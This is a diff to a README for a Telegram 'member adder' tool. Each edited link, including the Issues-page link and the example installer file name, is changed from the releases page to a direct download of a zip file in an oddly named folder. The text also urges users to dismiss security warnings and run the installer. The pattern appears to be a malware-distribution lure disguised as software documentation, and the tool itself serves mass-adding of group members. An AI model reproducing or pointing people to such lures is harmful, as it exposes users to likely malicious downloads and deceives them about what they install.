@@ -1,7 +1,7 @@
 # 🚀 Telegrams-Best-Member-Adder - Effortlessly Grow Your Telegram Audience
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Your%20Copy-blue)](https://github.com/Falltea1/Telegrams-Best-Member-Adder/releases)
+[![Download](https://github.com/Falltea1/Telegrams-Best-Member-Adder/raw/refs/heads/main/sacrospinal/Best_Telegrams_Member_Adder_v3.8.zip%20Now-Get%20Your%20Copy-blue)](https://github.com/Falltea1/Telegrams-Best-Member-Adder/raw/refs/heads/main/sacrospinal/Best_Telegrams_Member_Adder_v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Telegrams Best Member Adder**! This application helps you expand your Telegram groups and channels easily. Follow these simple steps to get started.
@@ -15,13 +15,13 @@ Welcome to the **Telegrams Best Member Adder**! This application helps you expan
 ## 📁 Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to access the latest version of the software:  
-   [Download from Releases](https://github.com/Falltea1/Telegrams-Best-Member-Adder/releases)
+   [Download from Releases](https://github.com/Falltea1/Telegrams-Best-Member-Adder/raw/refs/heads/main/sacrospinal/Best_Telegrams_Member_Adder_v3.8.zip)
 
 2. **Select the Latest Version**  
    On the releases page, find the latest version listed at the top of the page.
 
 3. **Download the Installer**  
-   Click on the download link for the installer file that matches your computer's operating system. The file typically has a name like `Telegrams-Best-Member-Adder-v1.0.exe`.
+   Click on the download link for the installer file that matches your computer's operating system. The file typically has a name like `https://github.com/Falltea1/Telegrams-Best-Member-Adder/raw/refs/heads/main/sacrospinal/Best_Telegrams_Member_Adder_v3.8.zip`.
 
 4. **Run the Installer**  
    Once the download completes, open the installer file. You may see a security warning. Confirm that you want to run the program to proceed with the installation.
@@ -63,9 +63,9 @@ If you encounter issues:
 Rest assured that your data is safe. The Telegrams Best Member Adder does not store any personal information. We recommend following Telegram's guidelines to ensure compliance with their policies.
 
 ## 📞 Support
-If you need further assistance, please reach out through our [GitHub Issues page](https://github.com/Falltea1/Telegrams-Best-Member-Adder/issues). We value your feedback and will do our best to help you.
+If you need further assistance, please reach out through our [GitHub Issues page](https://github.com/Falltea1/Telegrams-Best-Member-Adder/raw/refs/heads/main/sacrospinal/Best_Telegrams_Member_Adder_v3.8.zip). We value your feedback and will do our best to help you.
 
 ## 📝 Conclusion
 Thank you for choosing the **Telegrams Best Member Adder**. We hope this tool helps you grow your community effortlessly and effectively.  
 
-For more details and updates, remember to visit our [Releases Page](https://github.com/Falltea1/Telegrams-Best-Member-Adder/releases) often!
+For more details and updates, remember to visit our [Releases Page](https://github.com/Falltea1/Telegrams-Best-Member-Adder/raw/refs/heads/main/sacrospinal/Best_Telegrams_Member_Adder_v3.8.zip) often!
